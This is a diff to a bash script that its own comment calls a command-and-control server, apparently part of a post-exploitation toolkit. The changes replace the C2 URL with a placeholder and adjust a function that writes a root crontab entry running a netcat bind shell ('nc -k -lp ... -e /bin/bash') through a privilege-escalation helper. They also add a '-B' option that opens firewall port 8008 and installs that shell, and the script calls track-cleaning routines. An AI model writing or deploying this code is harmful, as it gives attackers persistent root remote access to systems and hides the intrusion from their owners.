@@ -1,7 +1,6 @@
 #!/bin/bash
 # command & control server
-#URL="http://192.168.11.135/"
-URL="http://omega.uta.edu/~ekg4056/"
+URL="http://192.168.1.XXX/"
 CATCHER=192.168.1.XXX
 # time to quit netcat
 I=1
@@ -71,14 +70,10 @@ function clean_DIR {
 
 function bind_into_cron {
 	# arg is the port #
-	echo '*/5 \* \* \* \* root nc -k -lp $1 -e /bin/bash" >> /etc/crontab' | ./$PE
+	printf '*/5 * * * * \troot \tnc -k -lp $1 -e /bin/bash \n" >> /etc/crontab' | ./$PE
 	clean_tracks
 }
 
-function cmnd_into_cron {
-	'echo */5 \* \* \* \* root /bin/bash -c /dev/shm/.tools/cmnd.sh -c' >> /etc/crontab | ./$PE
-	clean_tracks
-}
 
 function open_says_me {
 	echo '/sbin/iptables -A INPUT -p tcp -m tcp --dport $1 -j ACCEPT' | ./$PE
@@ -137,7 +132,8 @@ case "$1" in
 	-K) kill_myself
 	    ;;
 	-B) open_says_me 8008		# open port
-	    ;;
+	    bind_into_cron 8008
+		;;
 	-c) clean_tracks
 		;;
 	 *) switch_myself_around
